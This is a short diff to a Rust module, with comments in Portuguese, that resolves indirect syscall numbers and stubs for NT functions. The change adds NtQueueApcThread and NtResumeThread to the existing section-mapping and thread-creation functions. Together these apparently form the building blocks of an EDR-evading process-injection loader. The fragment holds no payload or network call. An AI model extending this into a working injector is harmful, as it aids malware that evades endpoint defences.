@@ -4,11 +4,7 @@ use winapi::shared::minwindef::HMODULE;
 use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
 
 // Importa as globais que vão armazenar SSNs e stubs
-use crate::indirect_syscalls::globals::{
-    g_NtCreateSectionSSN, g_NtCreateSectionSyscall,
-    g_NtCreateThreadExSSN, g_NtCreateThreadExSyscall,
-    g_NtMapViewOfSectionSSN, g_NtMapViewOfSectionSyscall,
-};
+use crate::indirect_syscalls::globals::{g_NtCreateSectionSSN, g_NtCreateSectionSyscall, g_NtCreateThreadExSSN, g_NtCreateThreadExSyscall, g_NtMapViewOfSectionSSN, g_NtMapViewOfSectionSyscall, g_NtQueueApcThreadSSN, g_NtQueueApcThreadSyscall, g_NtResumeThreadSSN, g_NtResumeThreadSyscall};
 
 #[derive(Debug, Clone)]
 pub struct IndirectSyscall {
@@ -70,10 +66,12 @@ pub unsafe fn init_indirect_syscalls() {
         std::process::exit(1);
     }
 
-    let mut functions: [(&str, *mut u32, *mut *const u8); 3] = [
+    let mut functions: [(&str, *mut u32, *mut *const u8); 5] = [
         ("NtCreateSection", &mut g_NtCreateSectionSSN, &mut g_NtCreateSectionSyscall),
         ("NtMapViewOfSection", &mut g_NtMapViewOfSectionSSN, &mut g_NtMapViewOfSectionSyscall),
         ("NtCreateThreadEx", &mut g_NtCreateThreadExSSN, &mut g_NtCreateThreadExSyscall),
+        ("NtQueueApcThread", &mut g_NtQueueApcThreadSSN, &mut g_NtQueueApcThreadSyscall),
+        ("NtResumeThread", &mut g_NtResumeThreadSSN, &mut g_NtResumeThreadSyscall),
     ];
 
     for (name, ssn_ptr, stub_ptr) in functions.iter_mut() {
